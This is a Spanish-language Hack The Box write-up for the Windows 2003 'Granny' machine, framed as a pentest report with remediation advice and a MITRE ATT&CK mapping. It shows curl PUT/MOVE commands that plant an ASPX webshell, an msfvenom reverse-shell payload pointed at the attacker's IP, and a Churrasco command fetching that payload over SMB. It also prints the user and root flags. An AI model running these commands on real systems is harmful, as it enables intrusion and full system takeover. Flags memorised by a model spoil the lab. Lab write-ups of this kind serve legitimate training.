---
title: "Informe Técnico: Granny (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Granny de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Granny

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Granny** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** IIS 6.0 WebDAV ScStoragePathFromUrl Buffer Overflow + PUT/MOVE WebShell
* **Vector de Elevación de Privilegios:** SeImpersonatePrivilege - Churrasco.exe (JuicyPotato)
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Granny |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Windows |
| **Nivel de Dificultad** | Easy |
| **CVE(s) Involucrados** | CVE-2017-7269 |
| **Vector de Entrada** | IIS 6.0 WebDAV ScStoragePathFromUrl Buffer Overflow + PUT/MOVE WebShell |
| **Mecanismo de Escalada** | SeImpersonatePrivilege - Churrasco.exe (JuicyPotato) |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: IIS 6.0 WebDAV ScStoragePathFromUrl Buffer Overflow + PUT/MOVE WebShell
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: SeImpersonatePrivilege - Churrasco.exe (JuicyPotato)
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

CVE(s): CVE-2017-7269
GTFOBins/Abusos (sudo/SUID): N/A
Initial Access Exploit (Ingreso): IIS 6.0 WebDAV ScStoragePathFromUrl Buffer Overflow + PUT/MOVE WebShell

Privilege Escalation (Escalada): SeImpersonatePrivilege - Churrasco.exe (JuicyPotato)



| Campo | Detalle |
| --- | --- |
| Nombre | Granny |
| OS | Windows Server 2003 (IIS 6.0) |
| Dificultad | Easy |
| CVE | CVE-2017-7269 |
| Acceso Inicial | IIS 6.0 WebDAV ScStoragePathFromUrl Buffer Overflow |
| Escalada | SeImpersonatePrivilege (Churrasco/JuicyPotato) |

---

## Reconocimiento

Se identifico **1 puerto TCP abierto** (puerto 80 - IIS 6.0). El servidor web es el unico servicio expuesto:

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_01.png)

## Enumeracion

El script de Nmap **http-webdav-scan** identifico los metodos HTTP permitidos en el servidor, revelando que WebDAV esta habilitado:

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_02.png)

El servidor ejecuta el framework [**ASP.NET**](http://ASP.NET) sobre IIS 6.0:

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_03.png)

## Explotacion

El metodo HTTP **PUT** permite subir archivos al servidor a traves de WebDAV. Sin embargo, la subida directa de archivos .aspx esta bloqueada. La tecnica consiste en subir un archivo .txt con contenido ASPX y luego usar el metodo MOVE para renombrarlo a .aspx:

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_04.png)

Alternativamente, la maquina es vulnerable a **CVE-2017-7269**, un buffer overflow en la funcion `ScStoragePathFromUrl` de IIS 6.0 WebDAV que permite ejecucion remota de codigo. El modulo de Metasploit `iis_webdav_scstoragepathfromurl` explota esta vulnerabilidad:

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_05.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_06.png)

## Escalada de Privilegios

Se utilizo **local_exploit_suggester** de Metasploit para identificar rutas de escalada. La shell inicial se obtiene como `NT AUTHORITY\NETWORK SERVICE`, que tiene el privilegio **SeImpersonatePrivilege** habilitado.

### Metodo alternativo: WebShell + SMBServer + NC

Se puede explotar manualmente subiendo una webshell via PUT + MOVE:

```
curl -s -X PUT http://10.10.10.15/webshell.txt -d @webshell.aspx
curl -s -X MOVE -H "Destination:http://10.10.10.15/webshell.aspx" http://10.10.10.15/webshell.txt
```

Luego se usa `impacket-smbserver` para servir `nc.exe` y obtener reverse shell:

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_07.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_08.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_09.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_10.png)

## Flags

### User Flag (Lakis)

Flag del usuario Lakis: `700c5dc163014e22b3e408f8703f67d1`

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_11.png)

### Root Flag (Administrator)

Flag del administrador: `aa4beed1c0584445ab463a6747bd06e9`

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/granny/images/step_12.png)

## Escalada Detallada - Churrasco (JuicyPotato para Windows 2003)

Con el privilegio `SeImpersonatePrivilege` habilitado, se utilizo **Churrasco.exe** (variante de JuicyPotato para Windows Server 2003) para escalar a SYSTEM:

1. Generar payload: `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=4566 -f exe -o rev.exe`
2. Servir archivos via SMB: `sudo impacket-smbserver smbFolder $(pwd)`
3. Ejecutar Churrasco: `\\10.10.14.8\smbFolder\churrasco.exe "\\10.10.14.8\smbFolder\rev.exe"`
4. Shell obtenida como `NT AUTHORITY\SYSTEM`

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (CVE-2017-7269).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (IIS 6.0 WebDAV ScStoragePathFromUrl Buffer Overflow + PUT/MOVE WebShell) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (SeImpersonatePrivilege - Churrasco.exe (JuicyPotato)) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
